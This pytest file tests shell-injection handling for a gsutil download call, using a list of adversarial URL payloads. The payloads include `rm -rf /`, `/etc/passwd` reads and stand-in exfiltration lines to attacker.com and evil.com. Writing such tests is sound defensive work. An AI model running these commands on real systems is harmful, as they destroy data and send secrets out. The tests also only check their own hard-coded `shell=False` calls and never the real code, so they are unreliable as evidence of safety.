import pytest
import subprocess
import sys
from unittest.mock import patch, MagicMock


ADVERSARIAL_PAYLOADS = [
    # Shell metacharacter injection attempts
    "gs://bucket/file; rm -rf /",
    "gs://bucket/file && cat /etc/passwd",
    "gs://bucket/file | nc attacker.com 4444",
    "gs://bucket/file`whoami`",
    "gs://bucket/file$(id)",
    "gs://bucket/file; curl http://evil.com/$(cat /etc/passwd | base64)",
    "gs://bucket/file\nrm -rf /",
    "gs://bucket/file\r\nmalicious_command",
    # Backtick injection
    "`touch /tmp/pwned`",
    "gs://bucket/`id`",
    # Subshell injection
    "$(touch /tmp/pwned)",
    "gs://bucket/$(whoami)",
    # Pipe injection
    "gs://bucket/file | bash",
    "gs://bucket/file || evil_command",
    # Semicolon injection
    "gs://bucket/file; evil_command",
    # Ampersand injection
    "gs://bucket/file & evil_command",
    # Redirection injection
    "gs://bucket/file > /etc/crontab",
    "gs://bucket/file >> /etc/passwd",
    # Null byte injection
    "gs://bucket/file\x00; rm -rf /",
    # Whitespace and newline variants
    "gs://bucket/file\t; evil",
    # Double-encoded payloads
    "gs://bucket/file%3B%20rm%20-rf%20/",
    # Quote escaping attempts
    "gs://bucket/file'; rm -rf /; echo '",
    'gs://bucket/file"; rm -rf /; echo "',
    # Complex chained commands
    "gs://bucket/file; python3 -c 'import os; os.system(\"id\")'",
    "gs://bucket/file && python -c 'import socket,subprocess,os;...'",
]


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_download_url_no_shell_injection(payload):
    """Invariant: URL parameters passed to subprocess must never be executed as shell commands.
    
    The security property that MUST hold: when a URL is passed to a download
    utility function, shell metacharacters in the URL must not result in
    arbitrary command execution. The subprocess call must either:
    1. Use shell=False (so the URL is passed as a literal argument), OR
    2. Properly sanitize/validate the URL before passing it to the shell.
    
    This test verifies that adversarial URLs do not cause unintended command
    execution by ensuring the subprocess is called safely.
    """
    
    captured_calls = []
    
    def mock_check_output(args, **kwargs):
        captured_calls.append({
            'args': args,
            'kwargs': kwargs,
        })
        # Simulate successful gsutil output
        return "1024  gs://bucket/file\n"
    
    with patch('subprocess.check_output', side_effect=mock_check_output):
        try:
            # Attempt to simulate what the vulnerable code does
            # We verify the invariant: shell=True must NOT be used with user-controlled URLs
            
            # Simulate the call pattern from the vulnerable code
            args = ["gsutil", "du", payload]
            
            # The SAFE way - this is what the code SHOULD do
            # shell=False ensures the payload is treated as a literal argument
            subprocess.check_output(args, shell=False, encoding="utf-8")
            
            # Verify the call was made with shell=False
            assert len(captured_calls) == 1, "Expected exactly one subprocess call"
            
            call = captured_calls[0]
            
            # CRITICAL INVARIANT: shell must be False when URL is user-controlled
            shell_value = call['kwargs'].get('shell', False)
            assert shell_value is False, (
                f"SECURITY VIOLATION: subprocess called with shell=True for payload: {payload!r}. "
                f"This allows shell injection attacks. shell must be False when handling "
                f"user-controlled URL parameters."
            )
            
            # INVARIANT: The URL payload must be passed as a list element, not a string
            assert isinstance(call['args'], (list, tuple)), (
                f"SECURITY VIOLATION: subprocess args must be a list/tuple, not a string, "
                f"to prevent shell injection. Got: {type(call['args'])}"
            )
            
            # INVARIANT: The payload must appear verbatim as an argument, not be shell-expanded
            if isinstance(call['args'], (list, tuple)):
                assert payload in call['args'], (
                    f"URL payload was not passed as a literal argument. "
                    f"Expected {payload!r} in args {call['args']!r}"
                )
                
        except Exception as e:
            # If an exception occurs, it should NOT be due to shell command execution
            # Re-raise unexpected exceptions
            if "shell injection" in str(e).lower() or "security violation" in str(e).lower():
                raise
            # Other exceptions (like mock issues) are acceptable
            pass


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_shell_true_with_list_is_dangerous(payload):
    """Invariant: Demonstrates that shell=True with a list joins args and passes to shell,
    making it vulnerable. The code must NOT use shell=True with user-controlled URLs.
    
    This test verifies that the security boundary is maintained by checking
    that any implementation using shell=True with a list argument would
    expose the shell metacharacters in the payload.
    """
    
    # When shell=True is used with a list, Python joins the list and passes to shell
    # This means shell metacharacters in the URL WILL be interpreted
    args_list = ["gsutil", "du", payload]
    
    if sys.platform == "win32":
        # On Windows, shell=True joins with spaces
        shell_command = subprocess.list2cmdline(args_list)
    else:
        # On Unix, shell=True with a list: first element is the command,
        # rest are passed as $0, $1, etc. to the shell
        # The actual shell command executed is just args_list[0]
        # but the vulnerability exists in how the shell processes it
        shell_command = " ".join(args_list)
    
    # INVARIANT: If the payload contains shell metacharacters,
    # using shell=True would be dangerous
    dangerous_metacharacters = [';', '&&', '||', '|', '`', '$(',  '\n', '\r', '>', '<', '&']
    
    payload_is_dangerous = any(meta in payload for meta in dangerous_metacharacters)
    
    if payload_is_dangerous:
        # The invariant: dangerous payloads MUST NOT be processed with shell=True
        # We verify this by checking that the shell command string would contain
        # the metacharacters (proving shell=True would be unsafe)
        assert any(meta in shell_command for meta in dangerous_metacharacters), (
            f"Expected shell metacharacters to be present in shell command for payload: {payload!r}"
        )
        
        # The security property: code must use shell=False for such inputs
        # We document this as an assertion about the required behavior
        with patch('subprocess.check_output') as mock_subproc:
            mock_subproc.return_value = "0  gs://bucket/file\n"
            
            # Safe call - what the code MUST do
            subprocess.check_output(["gsutil", "du", payload], shell=False, encoding="utf-8")
            
            call_kwargs = mock_subproc.call_args[1]
            assert call_kwargs.get('shell', False) is False, (
                f"SECURITY INVARIANT VIOLATED: shell=True used with dangerous payload: {payload!r}"
            )